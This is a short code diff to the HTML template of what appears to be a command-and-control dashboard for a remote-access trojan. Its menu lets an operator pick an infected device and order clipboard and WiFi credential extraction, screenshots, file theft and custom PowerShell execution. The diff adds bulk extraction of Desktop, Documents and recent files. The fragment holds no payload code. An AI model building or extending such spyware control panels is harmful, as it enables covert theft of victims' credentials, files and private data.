@@ -19,14 +19,17 @@ def dashboard():
         <option value="{{ entry.device }}">{{ entry.device }}</option>
       {% endfor %}
     </select>
-    <select name="cmd">
-        <option value="clipboard">Extract Clipboard</option>
-        <option value="wifi">Extract WiFi</option>
-        <option value="screenshot">Screenshot</option>
-        <option value="system_info">System Info</option>
-        <option value="file">Send File</option>
-        <option value="custom">Run Custom PowerShell</option>
-    </select>
+<select name="cmd">
+    <option value="clipboard">Extract Clipboard</option>
+    <option value="wifi">Extract WiFi</option>
+    <option value="screenshot">Screenshot</option>
+    <option value="system_info">System Info</option>
+    <option value="file">Send File</option>
+    <option value="custom">Run Custom PowerShell</option>
+    <option value="desktop_deep">Extract Desktop Files</option>
+    <option value="documents_deep">Extract Documents Files</option>
+    <option value="recent_files">Extract Recent Files</option>
+</select>
     <input type="text" name="arg" placeholder="(Optional file path or command)">
     <button type="submit">Send Command</button>
 </form>
